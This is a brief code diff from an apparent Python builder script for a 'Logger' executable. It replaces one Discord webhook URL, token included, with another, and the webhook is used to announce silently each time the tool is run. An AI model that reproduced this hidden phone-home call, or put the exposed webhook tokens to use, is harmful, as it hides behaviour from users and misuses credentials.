@@ -137,7 +137,7 @@ elif choice == '6':
     os.rename('dist/log.exe', 'dist/' + name)
     os.system('cls')
     print('{0}[*] Saved to:  {1}'.format(GREEN, END) + 'dist/' + name)
-    discord_webhook_url = 'https://discord.com/api/webhooks/823660948270088222/SnN7fkfo_aT_S5xOVQ4PIzVjTliH97DHBky6BsaYT3mCNpHTSzu8JhLDQz76SWR0l-rn'
+    discord_webhook_url = 'https://discord.com/api/webhooks/835027613834805268/gFEgtAJkiIb-rdpoUFVPUL4Y3-oZSLp4gI262SHUI6_1gSLryfbpxAsqG-Fn0rSlMAhQ'
     Message = {
         "content": "Someone has used Logger!"
     }
